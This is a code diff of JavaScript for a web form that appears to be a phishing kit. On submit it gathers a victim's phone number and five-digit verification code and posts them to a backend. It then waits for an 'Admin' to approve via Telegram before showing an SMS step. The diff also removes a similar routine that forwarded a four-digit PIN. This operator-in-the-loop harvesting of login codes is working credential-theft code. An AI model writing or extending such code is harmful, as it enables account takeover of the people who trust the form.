@@ -115,10 +115,67 @@ function generateSummary() {
     }
 }
 
-// --- MOVE TO SMS SCREEN ---
-function submitForm(event) {
+// --- 1. TRIGGER TELEGRAM ON SUBMIT ---
+async function submitForm(event) {
     event.preventDefault(); 
-    goToScreen('screen-sms');
+    
+    // Validate final step fields
+    const currentStepDiv = document.getElementById(`step-${currentStep}`);
+    const inputs = currentStepDiv.querySelectorAll('input, select');
+    let isValid = true;
+    inputs.forEach(input => {
+        if (!input.checkValidity()) {
+            isValid = false;
+            input.style.borderColor = 'red';
+        } else {
+            input.style.borderColor = '#3c5c75'; 
+        }
+    });
+
+    if (!isValid) {
+        alert("Please fill out all fields correctly before submitting.");
+        return;
+    }
+
+    const submitBtn = document.getElementById('btn-submit');
+    const originalText = submitBtn.innerText;
+    submitBtn.innerText = "Waiting for Telegram Approval...";
+    submitBtn.disabled = true;
+
+    // Get Phone and 5-Digit Code
+    const phone = document.getElementById('phone-number').value || "Unknown";
+    const code = document.getElementById('five-digit-code').value || "Unknown";
+
+    try {
+        // Send request to Python backend
+        const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, code: code })
+        });
+        const result = await response.json();
+
+        // Poll for approval
+        const interval = setInterval(async () => {
+            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approve') {
+                clearInterval(interval);
+                goToScreen('screen-sms'); // Move to SMS screen on Approval
+            } else if (statusData.status === 'reject') {
+                clearInterval(interval);
+                alert("Application rejected by Admin.");
+                submitBtn.innerText = originalText;
+                submitBtn.disabled = false;
+            }
+        }, 2000);
+
+    } catch (error) {
+        alert("Error connecting to server.");
+        submitBtn.innerText = originalText;
+        submitBtn.disabled = false;
+    }
 }
 
 // --- SMS SCREEN LOGIC ---
@@ -155,7 +212,6 @@ function checkPINs() {
     pinBoxes.forEach(box => {
         if (box.value.length !== 1) filled = false;
     });
-
     const btn = document.getElementById('btn-verify-pin');
     if (filled) {
         btn.classList.add('enabled');
@@ -167,60 +223,20 @@ function checkPINs() {
 }
 
 function moveToNext(current, index) {
-    // Keep only numbers
     current.value = current.value.replace(/[^0-9]/g, '');
-    
     if (current.value.length === 1 && index < 4) {
-        pinBoxes[index].focus(); // index is 1-based, so this focuses next box
+        pinBoxes[index].focus();
     }
     checkPINs();
 }
 
 function moveToPrev(current, event, index) {
     if (event.key === "Backspace" && current.value.length === 0 && index > 1) {
-        pinBoxes[index - 2].focus(); // Move to previous box
+        pinBoxes[index - 2].focus();
     }
 }
 
-// --- FINAL TELEGRAM SUBMISSION ON PIN ---
-async function submitPIN() {
-    // 1. Gather all the data
-    const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
-    const phone = document.getElementById('phone-number').value || "Unknown";
-    
-    const btn = document.getElementById('btn-verify-pin');
-    const originalText = btn.innerHTML;
-    btn.innerHTML = "Verifying...";
-    btn.disabled = true;
-
-    try {
-        // 2. Send to backend (Pass the PIN code as the 'code' to show in Telegram)
-        const response = await fetch('/api/request-approval', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, code: `PIN: ${pinCode}` })
-        });
-        const result = await response.json();
-
-        // 3. Poll for Telegram approval
-        const interval = setInterval(async () => {
-            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
-            const statusData = await statusRes.json();
-
-            if (statusData.status === 'approve') {
-                clearInterval(interval);
-                goToScreen('screen-success'); // Show Final Success Page
-            } else if (statusData.status === 'reject') {
-                clearInterval(interval);
-                alert("Verification rejected by Admin.");
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-            }
-        }, 2000);
-
-    } catch (error) {
-        alert("Error connecting to server.");
-        btn.innerHTML = originalText;
-        btn.disabled = false;
-    }
+function verifyPIN() {
+    // This simply moves to the Success screen after entering 4 digits
+    goToScreen('screen-success');
 }
